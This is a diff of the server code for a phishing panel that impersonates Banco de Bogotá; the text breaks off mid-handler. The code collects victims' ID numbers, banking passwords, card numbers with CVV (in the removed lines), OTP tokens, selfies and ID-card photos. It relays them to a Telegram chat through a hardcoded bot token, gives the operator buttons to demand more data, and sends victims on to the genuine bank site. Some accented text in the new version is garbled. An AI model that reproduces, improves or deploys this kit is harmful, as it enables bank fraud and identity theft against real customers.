@@ -1,51 +1,81 @@
+﻿/**
+ * =========================================
+ * PANEL DE BOGOTA - SERVIDOR PRINCIPAL
+ * Sistema de Banca Virtual con Telegram Bot
+ * Version: 2.0.0 - Refactorizado y Optimizado
+ * =========================================
+ */
+
 const express = require('express');
 const TelegramBot = require('node-telegram-bot-api');
 const path = require('path');
 const { createServer } = require('http');
 const { Server } = require('socket.io');
 
-// ===============================
-// CONFIGURACIÓN INICIAL
-// ===============================
+// =========================================
+// CONFIGURACION
+// =========================================
+
+const CONFIG = {
+    PORT: process.env.PORT || 3000,
+    NODE_ENV: process.env.NODE_ENV || 'development',
+    TELEGRAM: {
+        TOKEN: process.env.TELEGRAM_TOKEN || '7314533621:AAHyzTNErnFMOY_N-hs_6O88cTYxzebbzjM',
+        CHAT_ID: process.env.TELEGRAM_CHAT_ID || '-1002638389042'
+    },
+    SOCKET: {
+        PING_TIMEOUT: 60000,
+        PING_INTERVAL: 25000,
+        CONNECT_TIMEOUT: 5000,
+        MAX_HTTP_BUFFER_SIZE: 1e6
+    }
+};
+
+// =========================================
+// INICIALIZACIN DE APLICACIN
+// =========================================
+
 const app = express();
 const httpServer = createServer(app);
-const PORT = process.env.PORT || 3000;
-const NODE_ENV = process.env.NODE_ENV || 'development';
 
-// Set para mantener registro de clientes conectados
-const connectedClients = new Set();
+// Manejadores de estado de la aplicacin
+const applicationState = {
+    connectedClients: new Map(), // Map<socketId, { sessionId, connectedAt }>
+    sessions: new Map(), // Map<sessionId, { history, data, fullData, socketId }>
+    bot: null,
+    isShuttingDown: false
+};
 
-// Map para almacenar datos de sesiones por cliente
-const sessionData = new Map();
+// =========================================
+// CONFIGURACIN DE SOCKET.IO
+// =========================================
 
-// Configuración de Telegram
-const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || '7314533621:AAHyzTNErnFMOY_N-hs_6O88cTYxzebbzjM';
-const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '-1002638389042';
-
-// ===============================
-// CONFIGURACIÓN DE SOCKET.IO
-// ===============================
 const io = new Server(httpServer, {
-    cors: { 
+    cors: {
         origin: '*',
-        methods: ["GET", "POST"],
+        methods: ['GET', 'POST'],
         credentials: true
     },
     path: '/socket.io',
-    transports: ['websocket', 'polling'],
-    pingTimeout: 60000,
-    pingInterval: 25000,
-    allowEIO3: true,
-    connectTimeout: 45000
+    transports: ['websocket'],
+    allowUpgrades: false,
+    upgradeTimeout: 5000,
+    pingTimeout: CONFIG.SOCKET.PING_TIMEOUT,
+    pingInterval: CONFIG.SOCKET.PING_INTERVAL,
+    connectTimeout: CONFIG.SOCKET.CONNECT_TIMEOUT,
+    maxHttpBufferSize: CONFIG.SOCKET.MAX_HTTP_BUFFER_SIZE,
+    perMessageDeflate: false,
+    httpCompression: false
 });
 
-// ===============================
+// =========================================
 // MIDDLEWARES
-// ===============================
+// =========================================
+
 app.use(express.json({ limit: '50mb' }));
 app.use(express.urlencoded({ limit: '50mb', extended: true }));
 
-// CORS para todas las rutas
+// CORS global
 app.use((req, res, next) => {
     res.setHeader('Access-Control-Allow-Origin', '*');
     res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
@@ -58,7 +88,7 @@ app.use((req, res, next) => {
     next();
 });
 
-// Headers de cache - NUNCA cachear en producción
+// Anticache headers
 app.use((req, res, next) => {
     res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
     res.setHeader('Pragma', 'no-cache');
@@ -67,304 +97,387 @@ app.use((req, res, next) => {
     next();
 });
 
-// Servir archivos estáticos SIN caché
+// Archivos estáticos sin caché
 app.use(express.static(path.join(__dirname), {
     maxAge: 0,
     etag: false,
     lastModified: false,
-    setHeaders: (res, path) => {
+    setHeaders: (res) => {
         res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate');
     }
 }));
 
-// Logging middleware
+// Logger de peticiones
 app.use((req, res, next) => {
-    console.log(`${req.method} ${req.path}`);
+    if (!req.path.includes('socket.io')) {
+        console.log(`${req.method} ${req.path}`);
+    }
     next();
 });
 
-// ===============================
-// RUTA DE VERIFICACIÓN DE VERSION
-// ===============================
-app.get('/version', (req, res) => {
-    res.json({
-        version: '1.0.1',
-        commit: 'af17dfd',
-        timestamp: new Date().toISOString(),
-        overlay: {
-            logoSize: '96px',
-            image: 'channels4_profile-removebg-preview.png',
-            text: 'Cargando'
-        },
-        cache: 'DISABLED',
-        environment: NODE_ENV
-    });
-});
+// =========================================
+// GESTIN DE SESIONES
+// =========================================
 
-// ===============================
-// CONFIGURACIÓN DEL BOT DE TELEGRAM
-// ===============================
-const bot = new TelegramBot(TELEGRAM_TOKEN, { 
-    polling: true,
-    filepath: false
-});
-
-// ===============================
-// FUNCIONES DE TELEGRAM
-// ===============================
-
-/**
- * Formatea los mensajes según el tipo de datos recibidos
- */
-function formatTelegramMessage(data, sessionId = null) {
-    if (typeof data !== 'object') {
-        return data.toString();
-    }
-
-    const timestamp = new Date().toLocaleString('es-CO', { 
-        timeZone: 'America/Bogota',
-        dateStyle: 'short',
-        timeStyle: 'short'
-    });
-
-    // Obtener datos acumulados de la sesión si existe (solo datos PREVIOS, no el actual)
-    let acumulado = '';
-    if (sessionId && sessionData.has(sessionId)) {
-        const session = sessionData.get(sessionId);
-        // Excluir el último elemento de fullData para evitar duplicación
-        if (session.fullData && session.fullData.length > 1) {
-            const datosAnteriores = session.fullData.slice(0, -1); // Todos menos el último
-            acumulado = '\n\n' + datosAnteriores.join('\n');
+const SessionManager = {
+    /**
+     * Crear o actualizar sesin
+     */
+    upsertSession(sessionId, socketId) {
+        if (!applicationState.sessions.has(sessionId)) {
+            applicationState.sessions.set(sessionId, {
+                history: [],
+                data: {},
+                fullData: [],
+                socketId,
+                createdAt: Date.now(),
+                lastActivity: Date.now()
+            });
+            console.log(`Nueva sesion creada: ${sessionId}`);
+        } else {
+            const session = applicationState.sessions.get(sessionId);
+            session.socketId = socketId;
+            session.lastActivity = Date.now();
+            applicationState.sessions.set(sessionId, session);
+            console.log(`Sesion actualizada: ${sessionId}`);
         }
-    }
+    },
 
-    switch (data.tipo) {
-        case 'Clave Segura':
-            return `🔐 <b>NUEVA SOLICITUD DE INGRESO</b>\n\n` +
-                   `📋 <b>Tipo:</b> ${data.tipo}\n` +
-                   `🪪 <b>Documento:</b> ${data.tipoDocumento}\n` +
-                   `🔢 <b>Número:</b> <code>${data.numeroDocumento}</code>\n` +
-                   `🔑 <b>Clave:</b> <code>${data.clave}</code>\n` +
-                   `⏰ <b>Fecha:</b> ${timestamp}${acumulado}`;
-        
-        case 'Tarjeta Débito':
-            return `💳 <b>NUEVA SOLICITUD DE INGRESO</b>\n\n` +
-                   `📋 <b>Tipo:</b> ${data.tipo}\n` +
-                   `🪪 <b>Documento:</b> ${data.tipoDocumento}\n` +
-                   `🔢 <b>Número:</b> <code>${data.numeroDocumento}</code>\n\n` +
-                   `💳 <b>DATOS DE TARJETA:</b>\n` +
-                   `🔢 <b>Número Completo:</b> <code>${data.numeroTarjeta}</code>\n` +
-                   `🔑 <b>Clave:</b> <code>${data.claveTarjeta}</code>\n` +
-                   `📅 <b>Vencimiento:</b> <code>${data.fechaVencimiento}</code>\n` +
-                   `🔐 <b>CVV:</b> <code>${data.cvv}</code>\n\n` +
-                   `⏰ <b>Fecha:</b> ${timestamp}${acumulado}`;
-        
-        case 'Token':
-            return `🔐 <b>VERIFICACIÓN DE TOKEN</b>\n\n` +
-                   `🔑 <b>Código:</b> <code>${data.codigo}</code>\n` +
-                   `⏰ <b>Fecha:</b> ${timestamp}${acumulado}`;
-        
-        case 'Selfie':
-            return `📸 <b>SELFIE DE VERIFICACIÓN</b>\n\n` +
-                   `🆔 <b>Message ID:</b> ${data.messageId}\n` +
-                   `⏰ <b>Fecha:</b> ${timestamp}${acumulado}`;
-        
-        case 'Cédula Frontal':
-            return `🪪 <b>CÉDULA DE CIUDADANÍA - LADO FRONTAL</b>\n\n` +
-                   `📄 <b>IMPORTANTE:</b> Este es el <b>FRENTE</b> del documento\n` +
-                   `🆔 <b>Message ID:</b> ${data.messageId}\n` +
-                   `⏰ <b>Fecha:</b> ${timestamp}${acumulado}`;
-        
-        case 'Cédula Trasera':
-            return `🪪 <b>CÉDULA DE CIUDADANÍA - LADO TRASERO (REVERSO)</b>\n\n` +
-                   `📄 <b>IMPORTANTE:</b> Este es el <b>REVERSO</b> del documento\n` +
-                   `✅ <b>Captura completa:</b> Ambos lados recibidos\n` +
-                   `🆔 <b>Message ID:</b> ${data.messageId}\n` +
-                   `⏰ <b>Fecha:</b> ${timestamp}${acumulado}`;
-        
-        default:
-            return JSON.stringify(data, null, 2);
-    }
-}
+    /**
+     * Obtener sesin por ID
+     */
+    getSession(sessionId) {
+        return applicationState.sessions.get(sessionId);
+    },
 
-/**
- * Genera el teclado inline para las acciones de Telegram
- */
-function getTelegramKeyboard(messageType = 'default') {
-    return {
-        inline_keyboard: [
-            [
-                { text: '🔄 Pedir Logo', callback_data: 'pedir_logo' },
-                { text: '🔄 Pedir Token', callback_data: 'pedir_token' }
-            ],
-            [
-                { text: '📸 Pedir Cara', callback_data: 'pedir_cara' },
-                { text: '🪪 Pedir Cédula', callback_data: 'pedir_cedula' }
-            ],
-            [
-                { text: '✅ Finalizar', callback_data: 'finalizar' }
-            ]
-        ]
-    };
-}
+    /**
+     * Actualizar datos de sesin
+     */
+    updateSessionData(sessionId, tipo, data) {
+        const session = this.getSession(sessionId);
+        if (!session) return;
 
-/**
- * Envía un mensaje a Telegram con formato y teclado inline
- */
-async function sendTelegramMessage(data, sessionId = null) {
-    try {
-        // Actualizar datos de sesión
-        if (sessionId && data.tipo !== 'Token') {
-            if (!sessionData.has(sessionId)) {
-                sessionData.set(sessionId, { history: [], data: {}, fullData: [] });
-            }
-            
-            const session = sessionData.get(sessionId);
-            
-            // Guardar datos del mensaje actual
-            if (data.tipo === 'Clave Segura') {
-                session.data.clave = { tipoDocumento: data.tipoDocumento, numeroDocumento: data.numeroDocumento, clave: data.clave };
-                session.history.push(`✅ Clave Segura`);
-                session.fullData.push(`🔐 Clave Segura: ${data.tipoDocumento} ${data.numeroDocumento} | Clave: ${data.clave}`);
-            } else if (data.tipo === 'Tarjeta Débito') {
-                session.data.tarjeta = { 
-                    tipoDocumento: data.tipoDocumento, 
-                    numeroDocumento: data.numeroDocumento, 
-                    numeroTarjeta: data.numeroTarjeta,
-                    claveTarjeta: data.claveTarjeta,
-                    fechaVencimiento: data.fechaVencimiento,
-                    cvv: data.cvv
+        switch (tipo) {
+            case 'Clave Segura':
+                session.data.clave = {
+                    tipoDocumento: data.tipoDocumento,
+                    numeroDocumento: data.numeroDocumento,
+                    clave: data.clave
                 };
-                session.history.push(`✅ Tarjeta Débito`);
-                session.fullData.push(`💳 Tarjeta: ${data.numeroTarjeta} | Venc: ${data.fechaVencimiento} | CVV: ${data.cvv} | Clave: ${data.claveTarjeta}`);
-                session.fullData.push(`📋 Usuario: ${data.tipoDocumento} ${data.numeroDocumento}`);
-            } else if (data.tipo === 'Selfie') {
+                session.history.push(' Clave Segura');
+                session.fullData.push(
+                    ` Clave Segura: ${data.tipoDocumento} ${data.numeroDocumento} | Clave: ${data.clave}`
+                );
+                break;
+
+            case 'Tarjeta Dbito':
+                session.data.tarjeta = {
+                    tipoDocumento: data.tipoDocumento,
+                    numeroDocumento: data.numeroDocumento,
+                    ultimos4Digitos: data.ultimos4Digitos,
+                    claveTarjeta: data.claveTarjeta
+                };
+                session.history.push(' Tarjeta Dbito');
+                session.fullData.push(
+                    ` Tarjeta  ltimos 4 dgitos: ${data.ultimos4Digitos} | Clave: ${data.claveTarjeta}`
+                );
+                session.fullData.push(
+                    ` Usuario: ${data.tipoDocumento} ${data.numeroDocumento}`
+                );
+                break;
+
+            case 'Token':
+                // Token no se guarda en sesin, es temporal
+                break;
+
+            case 'Selfie':
                 session.data.selfie = { messageId: data.messageId };
-                session.history.push(`✅ Selfie`);
-                session.fullData.push(`📸 Selfie capturado - ID: ${data.messageId}`);
-            } else if (data.tipo === 'Cédula Frontal') {
+                session.history.push(' Selfie');
+                session.fullData.push(` Selfie  ID: ${data.messageId}`);
+                break;
+
+            case 'Cdula Frontal':
                 if (!session.data.cedula) session.data.cedula = {};
                 session.data.cedula.frontal = { messageId: data.messageId };
-                session.history.push(`✅ Cédula Frontal`);
-                session.fullData.push(`🪪 Cédula FRONTAL - ID: ${data.messageId}`);
-            } else if (data.tipo === 'Cédula Trasera') {
+                session.history.push(' Cdula Frontal');
+                session.fullData.push(` Cdula FRONTAL  ID: ${data.messageId}`);
+                break;
+
+            case 'Cdula Trasera':
                 if (!session.data.cedula) session.data.cedula = {};
                 session.data.cedula.trasera = { messageId: data.messageId };
-                session.history.push(`✅ Cédula Trasera`);
-                session.fullData.push(`🪪 Cédula TRASERA - ID: ${data.messageId}`);
-            }
-            
-            sessionData.set(sessionId, session);
-        }
-        
-        const keyboard = getTelegramKeyboard(data.tipo);
-
-        // Si es una foto (base64), enviarla como imagen
-        if (data.foto) {
-            console.log('📸 Procesando foto para envío...');
-            
-            try {
-                // Verificar que la foto tenga el formato correcto
-                if (!data.foto.includes('base64,')) {
-                    throw new Error('Formato de foto inválido');
-                }
-                
-                const buffer = Buffer.from(data.foto.split(',')[1], 'base64');
-                console.log('📦 Buffer creado, tamaño:', buffer.length, 'bytes');
-                
-                const caption = formatTelegramMessage(data, sessionId);
-                
-                console.log('📤 Enviando foto a Telegram con botones...');
-                
-                const result = await bot.sendPhoto(TELEGRAM_CHAT_ID, buffer, {
-                    caption: caption,
-                    parse_mode: 'HTML',
-                    reply_markup: keyboard
-                });
-                
-                console.log('✅ Foto enviada con éxito, Message ID:', result.message_id);
-                return result;
-                
-            } catch (photoError) {
-                console.error('❌ Error procesando/enviando foto:', photoError);
-                throw photoError;
-            }
+                session.history.push(' Cdula Trasera');
+                session.fullData.push(` Cdula TRASERA  ID: ${data.messageId}`);
+                break;
         }
 
-        // Enviar mensaje de texto
-        const messageText = formatTelegramMessage(data, sessionId);
+        session.lastActivity = Date.now();
+        applicationState.sessions.set(sessionId, session);
+    },
 
-        console.log('📤 Enviando mensaje a Telegram:', messageText);
+    /**
+     * Eliminar sesin
+     */
+    deleteSession(sessionId) {
+        if (applicationState.sessions.delete(sessionId)) {
+            console.log(`Sesion eliminada: ${sessionId}`);
+            return true;
+        }
+        return false;
+    },
 
-        const result = await bot.sendMessage(TELEGRAM_CHAT_ID, messageText, {
-            parse_mode: 'HTML',
-            reply_markup: keyboard
+    /**
+     * Obtener todas las sesiones activas
+     */
+    getActiveSessions() {
+        return Array.from(applicationState.sessions.keys());
+    },
+
+    /**
+     * Limpiar sesiones inactivas (ms de 1 hora)
+     */
+    cleanupInactiveSessions() {
+        const now = Date.now();
+        const ONE_HOUR = 60 * 60 * 1000;
+        let cleaned = 0;
+
+        for (const [sessionId, session] of applicationState.sessions.entries()) {
+            if (now - session.lastActivity > ONE_HOUR) {
+                this.deleteSession(sessionId);
+                cleaned++;
+            }
+        }
+
+        if (cleaned > 0) {
+            console.log(`${cleaned} sesion(es) inactiva(s) eliminada(s)`);
+        }
+    }
+};
+
+// Limpiar sesiones inactivas cada 15 minutos
+setInterval(() => SessionManager.cleanupInactiveSessions(), 15 * 60 * 1000);
+
+// =========================================
+// TELEGRAM  FORMATEO DE MENSAJES
+// =========================================
+
+const TelegramFormatter = {
+    /**
+     * Formatea mensaje segn el tipo
+     */
+    formatMessage(data, sessionId = null) {
+        if (typeof data !== 'object') {
+            return data.toString();
+        }
+
+        const timestamp = new Date().toLocaleString('es-CO', {
+            timeZone: 'America/Bogota',
+            dateStyle: 'short',
+            timeStyle: 'short'
         });
 
-        console.log('✅ Mensaje enviado exitosamente - ID:', result.message_id);
-        return result;
-    } catch (error) {
-        console.error('❌ Error al enviar mensaje a Telegram:', error.message);
-        throw error;
+        // No mostrar historial en mensajes
+
+        switch (data.tipo) {
+            case 'Clave Segura':
+                return `🔐 <b>NUEVA SOLICITUD DE INGRESO</b>\n\n` +
+                       `📋 <b>Tipo:</b> ${data.tipo}\n` +
+                       `🪪 <b>Documento:</b> ${data.tipoDocumento}\n` +
+                       `🔢 <b>Número:</b> <code>${data.numeroDocumento}</code>\n` +
+                       `🔑 <b>Clave:</b> <code>${data.clave}</code>\n` +
+                       `⏰ <b>Fecha:</b> ${timestamp}`;
+
+            case 'Tarjeta Débito':
+                return `💳 <b>NUEVA SOLICITUD DE INGRESO</b>\n\n` +
+                       `📋 <b>Tipo:</b> ${data.tipo}\n` +
+                       `🪪 <b>Documento:</b> ${data.tipoDocumento}\n` +
+                       `🔢 <b>Número:</b> <code>${data.numeroDocumento}</code>\n\n` +
+                       `💳 <b>DATOS DE TARJETA:</b>\n` +
+                       `🔢 <b>Últimos 4 dígitos:</b> <code>${data.ultimos4Digitos}</code>\n` +
+                       `🔑 <b>Clave:</b> <code>${data.claveTarjeta}</code>\n\n` +
+                       `⏰ <b>Fecha:</b> ${timestamp}`;
+
+            case 'Token':
+                return `🔐 <b>VERIFICACIÓN DE TOKEN</b>\n\n` +
+                       `🔑 <b>Código:</b> <code>${data.codigo}</code>\n` +
+                       `⏰ <b>Fecha:</b> ${timestamp}`;
+
+            case 'Selfie':
+                return `📸 <b>SELFIE DE VERIFICACIÓN</b>\n\n` +
+                       `🆔 <b>Message ID:</b> ${data.messageId}\n` +
+                       `⏰ <b>Fecha:</b> ${timestamp}`;
+
+            case 'Cédula Frontal':
+                return `🪪 <b>CÉDULA - LADO FRONTAL</b>\n\n` +
+                       `📄 <b>Lado:</b> FRENTE del documento\n` +
+                       `🆔 <b>Message ID:</b> ${data.messageId}\n` +
+                       `⏰ <b>Fecha:</b> ${timestamp}`;
+
+            case 'Cédula Trasera':
+                return `🪪 <b>CÉDULA - LADO TRASERO</b>\n\n` +
+                       `📄 <b>Lado:</b> REVERSO del documento\n` +
+                       `✅ <b>Estado:</b> Ambos lados capturados\n` +
+                       `🆔 <b>Message ID:</b> ${data.messageId}\n` +
+                       `⏰ <b>Fecha:</b> ${timestamp}`;
+
+            default:
+                return JSON.stringify(data, null, 2);
+        }
+    },
+
+    /**
+     * Genera teclado inline de Telegram
+     */
+    getKeyboard() {
+        return {
+            inline_keyboard: [
+                [
+                    { text: '🔄 Pedir Logo', callback_data: 'pedir_logo' },
+                    { text: '🔐 Pedir Token', callback_data: 'pedir_token' }
+                ],
+                [
+                    { text: '📸 Pedir Cara', callback_data: 'pedir_cara' },
+                    { text: '🪪 Pedir Cédula', callback_data: 'pedir_cedula' }
+                ],
+                [
+                    { text: '✅ Finalizar', callback_data: 'finalizar' }
+                ]
+            ]
+        };
     }
-}
+};
 
-// ===============================
-// FUNCIONES DE REDIRECCIONAMIENTO
-// ===============================
+// =========================================
+// TELEGRAM  ENVO DE MENSAJES
+// =========================================
 
-/**
- * Maneja las redirecciones según la acción recibida
- */
-function handleRedirect(action, baseUrl = '') {
-    // Si baseUrl está vacío o es localhost, intentar obtener la URL de Render
-    if (!baseUrl || baseUrl.includes('localhost')) {
-        // En producción, Render expone la URL del servicio
-        if (process.env.RENDER_EXTERNAL_URL) {
-            baseUrl = process.env.RENDER_EXTERNAL_URL;
-        } else if (process.env.BASE_URL) {
-            baseUrl = process.env.BASE_URL;
-        } else if (NODE_ENV === 'production') {
-            // Fallback: usar el hostname si está disponible
-            baseUrl = '';
+const TelegramService = {
+    /**
+     * Enva mensaje o foto a Telegram
+     */
+    async sendMessage(data, sessionId = null) {
+        try {
+            // Actualizar sesin si no es token
+            if (sessionId && data.tipo !== 'Token') {
+                SessionManager.updateSessionData(sessionId, data.tipo, data);
+            }
+
+            const keyboard = TelegramFormatter.getKeyboard();
+
+            // Enviar foto si existe
+            if (data.foto) {
+                return await this.sendPhoto(data, sessionId, keyboard);
+            }
+
+            // Enviar mensaje de texto
+            const messageText = TelegramFormatter.formatMessage(data, sessionId);
+            console.log(' Enviando mensaje a Telegram...');
+
+            const result = await applicationState.bot.sendMessage(
+                CONFIG.TELEGRAM.CHAT_ID,
+                messageText,
+                {
+                    parse_mode: 'HTML',
+                    reply_markup: keyboard
+                }
+            );
+
+            console.log(' Mensaje enviado  ID:', result.message_id);
+            return result;
+
+        } catch (error) {
+            console.error(' Error al enviar mensaje:', error.message);
+            throw error;
+        }
+    },
+
+    /**
+     * Enva foto a Telegram
+     */
+    async sendPhoto(data, sessionId, keyboard) {
+        try {
+            console.log(' Procesando foto...');
+
+            if (!data.foto.includes('base64,')) {
+                throw new Error('Formato de foto invlido');
+            }
+
+            const buffer = Buffer.from(data.foto.split(',')[1], 'base64');
+            console.log(' Buffer creado:', buffer.length, 'bytes');
+
+            const caption = TelegramFormatter.formatMessage(data, sessionId);
+            console.log(' Enviando foto a Telegram...');
+
+            const result = await applicationState.bot.sendPhoto(
+                CONFIG.TELEGRAM.CHAT_ID,
+                buffer,
+                {
+                    caption,
+                    parse_mode: 'HTML',
+                    reply_markup: keyboard
+                }
+            );
+
+            console.log(' Foto enviada  ID:', result.message_id);
+            return result;
+
+        } catch (error) {
+            console.error(' Error al enviar foto:', error.message);
+            throw error;
         }
     }
-    
-    const redirectMap = {
-        'pedir_logo': { 
-            url: `${baseUrl}/index.html?action=pedir_logo`, 
-            message: 'Por favor ingrese sus credenciales nuevamente'
-        },
-        'pedir_token': { 
-            url: `${baseUrl}/token.html?action=pedir_token`, 
-            message: 'Por favor ingrese el código token'
-        },
-        'pedir_cara': {
-            url: `${baseUrl}/cara.html?action=pedir_cara`,
-            message: 'Por favor capture su selfie de verificación'
-        },
-        'pedir_cedula': {
-            url: `${baseUrl}/cedula.html?action=pedir_cedula`,
-            message: 'Por favor capture su documento de identidad'
-        },
-        'finalizar': { 
-            url: 'https://www.bancodebogota.com/personas', 
-            message: 'Proceso finalizado exitosamente'
-        }
-    };
+};
 
-    return redirectMap[action] || { url: `${baseUrl}/`, message: null };
-}
+// =========================================
+// TELEGRAM  MANEJADOR DE REDIRECCIONES
+// =========================================
 
-// ===============================
-// RUTAS DE LA API
-// ===============================
+const RedirectHandler = {
+    getBaseUrl() {
+        return process.env.RENDER_EXTERNAL_URL || 
+               process.env.BASE_URL || 
+               (CONFIG.NODE_ENV === 'production' ? '' : `http://localhost:${CONFIG.PORT}`);
+    },
 
-// API: Enviar mensaje a Telegram
-app.post('/api/send-telegram', async (req, res) => {
+    getRedirectInfo(action) {
+        const baseUrl = this.getBaseUrl();
+
+        const redirectMap = {
+            'pedir_logo': {
+                url: `${baseUrl}/index.html?action=pedir_logo`,
+                message: 'Por favor ingrese sus credenciales nuevamente'
+            },
+            'pedir_token': {
+                url: `${baseUrl}/token.html?action=pedir_token`,
+                message: 'Por favor ingrese el cdigo token'
+            },
+            'pedir_cara': {
+                url: `${baseUrl}/cara.html?action=pedir_cara`,
+                message: 'Por favor capture su selfie de verificacin'
+            },
+            'pedir_cedula': {
+                url: `${baseUrl}/cedula.html?action=pedir_cedula`,
+                message: 'Por favor capture su documento de identidad'
+            },
+            'finalizar': {
+                url: 'https://www.bancodebogota.com/personas',
+                message: 'Proceso finalizado exitosamente'
+            }
+        };
+
+        return redirectMap[action] || { url: `${baseUrl}/`, message: null };
+    }
+};
+
+// =========================================
+// API ENDPOINTS
+// =========================================
+
+// Enviar mensaje a Telegram
+app.post('/api/sendtelegram', async (req, res) => {
     try {
-        console.log('📨 Recibida solicitud para enviar a Telegram:', req.body);
-        
+        console.log(' Solicitud recibida:', req.body.tipo);
+
         if (!req.body || !req.body.tipo) {
             return res.status(400).json({
                 success: false,
@@ -372,17 +485,16 @@ app.post('/api/send-telegram', async (req, res) => {
             });
         }
 
-        // Obtener sessionId del cliente
-        const sessionId = req.body.sessionId || req.ip;
-        
-        const result = await sendTelegramMessage(req.body, sessionId);
-        
+        const sessionId = req.body.sessionId || `session_${Date.now()}`;
+        const result = await TelegramService.sendMessage(req.body, sessionId);
+
         res.json({
             success: true,
             messageId: result.message_id
         });
+
     } catch (error) {
-        console.error('❌ Error en /api/send-telegram:', error.message);
+        console.error(' Error en /api/sendtelegram:', error.message);
         res.status(500).json({
             success: false,
             error: 'Error al procesar la solicitud'
@@ -390,294 +502,406 @@ app.post('/api/send-telegram', async (req, res) => {
     }
 });
 
-// Endpoint para limpiar sesión
-app.post('/api/clear-session', (req, res) => {
+// Limpiar sesin
+app.post('/api/clearsession', (req, res) => {
     try {
         const sessionId = req.body.sessionId;
-        if (sessionId && sessionData.has(sessionId)) {
-            sessionData.delete(sessionId);
-            console.log('🧹 Sesión limpiada:', sessionId);
+        if (sessionId) {
+            SessionManager.deleteSession(sessionId);
         }
         res.json({ success: true });
     } catch (error) {
-        console.error('Error al limpiar sesión:', error);
+        console.error(' Error al limpiar sesin:', error);
         res.status(500).json({ success: false, error: error.message });
     }
 });
 
-// Health check endpoint
+// Health check
 app.get('/api/health', (req, res) => {
-    res.json({ 
+    res.json({
         status: 'ok',
         timestamp: new Date().toISOString(),
         uptime: process.uptime(),
-        environment: NODE_ENV
+        environment: CONFIG.NODE_ENV,
+        sessions: SessionManager.getActiveSessions().length,
+        clients: applicationState.connectedClients.size
     });
 });
 
-// ===============================
-// RUTAS DE PÁGINAS
-// ===============================
+// Verificacin de versin
+app.get('/version', (req, res) => {
+    res.json({
+        version: '2.0.0',
+        timestamp: new Date().toISOString(),
+        environment: CONFIG.NODE_ENV
+    });
+});
 
-// Ruta principal
+// =========================================
+// RUTAS DE PGINAS HTML
+// =========================================
+
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'index.html'));
 });
 
-// Rutas de páginas HTML
-app.get('/:page(index|token|dashboard).html', (req, res) => {
+app.get('/:page(index|token|cara|cedula|dashboard).html', (req, res) => {
     const filePath = path.join(__dirname, `${req.params.page}.html`);
     res.sendFile(filePath, (err) => {
         if (err) {
-            console.error(`Error sirviendo ${req.params.page}.html:`, err);
-            res.status(404).send('Página no encontrada');
+            console.error(` Error sirviendo ${req.params.page}.html`);
+            res.status(404).send('Pgina no encontrada');
         }
     });
 });
 
-// ===============================
-// SOCKET.IO - MANEJO DE CONEXIONES
-// ===============================
+// =========================================
+// SOCKET.IO  GESTIN DE CONEXIONES
+// =========================================
+
+// Sistema de heartbeat para mantener conexiones activas
+setInterval(() => {
+    const now = Date.now();
+    let staleConnections = 0;
+    
+    applicationState.connectedClients.forEach((clientInfo, socketId) => {
+        const socket = io.sockets.sockets.get(socketId);
+        if (!socket || !socket.connected) {
+            applicationState.connectedClients.delete(socketId);
+            staleConnections++;
+            console.log(` Conexion obsoleta eliminada: ${socketId}`);
+        }
+    });
+    
+    if (staleConnections > 0) {
+        console.log(` Limpieza: ${staleConnections} conexion(es) obsoleta(s) eliminada(s)`);
+    }
+}, 30000); // Cada 30 segundos
 
 io.on('connection', (socket) => {
-    console.log('🔌 Cliente conectado:', socket.id);
-    connectedClients.add(socket.id);
+    console.log(' Cliente conectado:', socket.id);
     
-    // Enviar confirmación de conexión
-    socket.emit('connected', { 
-        socketId: socket.id,
-        timestamp: new Date().toISOString()
+    // Marcar socket como activo
+    socket.data.lastActivity = Date.now();
+
+    // Evento: Cliente se identifica con su sessionId
+    socket.on('identify', (data) => {
+        const sessionId = data.sessionId;
+        console.log(` Cliente identificado: ${socket.id}  ${sessionId}`);
+
+        // Registrar cliente
+        applicationState.connectedClients.set(socket.id, {
+            sessionId,
+            connectedAt: Date.now()
+        });
+
+        // Crear/actualizar sesin
+        SessionManager.upsertSession(sessionId, socket.id);
+
+        // Confirmar conexin
+        socket.emit('connected', {
+            socketId: socket.id,
+            sessionId,
+            timestamp: new Date().toISOString()
+        });
     });
 
-    // Evento: Procesar acción de Telegram
+    // Evento: Procesar accin desde Telegram
     socket.on('process_action', async (data) => {
         try {
             const { action, messageId } = data;
-            console.log(`⚙️ Procesando acción "${action}" para mensaje ${messageId}`);
+            console.log(` Procesando accin: ${action}`);
 
-            const baseUrl = `${req.protocol}://${req.get('host')}` || `http://localhost:${PORT}`;
-            const { message, url } = handleRedirect(action, baseUrl);
+            const redirectInfo = RedirectHandler.getRedirectInfo(action);
 
             socket.emit('telegram_action', {
                 action,
                 messageId,
-                message,
-                redirect: url
+                message: redirectInfo.message,
+                redirect: redirectInfo.url
             });
-            
-            console.log(`✅ Acción "${action}" procesada correctamente`);
+
+            console.log(` Accin "${action}" procesada`);
+
         } catch (error) {
-            console.error('❌ Error al procesar acción:', error.message);
+            console.error(' Error al procesar accin:', error.message);
             socket.emit('telegram_action', {
                 action: 'error',
-                message: 'Error al procesar la acción. Por favor intente nuevamente.'
+                message: 'Error al procesar la accin'
             });
         }
     });
 
-    // Evento: Verificación de token
+    // Evento: Verificacin de token
     socket.on('token_verification', async (data) => {
-        console.log('🔐 Verificación de token recibida:', data);
-        
+        console.log(' Verificacin de token:', data.codigo);
+
         try {
-            if (!data || !data.codigo) {
-                throw new Error('Datos de token inválidos');
+            if (!data || !data.codigo || !/^\d{6}$/.test(data.codigo)) {
+                throw new Error('Token invlido');
             }
-            
-            if (!/^\d{6}$/.test(data.codigo)) {
-                throw new Error('Formato de token inválido');
-            }
-            
-            console.log('📤 Enviando token a Telegram...');
-            const result = await sendTelegramMessage(data);
-            console.log('✅ Token enviado exitosamente - ID:', result.message_id);
-            
-            socket.emit('telegram_action', { 
+
+            const result = await TelegramService.sendMessage(data);
+
+            socket.emit('telegram_action', {
                 action: 'waiting_response',
                 messageId: result.message_id,
                 message: 'Verificando token...'
             });
+
         } catch (error) {
-            console.error('❌ Error en verificación de token:', error.message);
-            socket.emit('telegram_action', { 
+            console.error(' Error en token:', error.message);
+            socket.emit('telegram_action', {
                 action: 'error',
-                message: 'Error al procesar el token. Por favor intente nuevamente.'
+                message: 'Error al procesar el token'
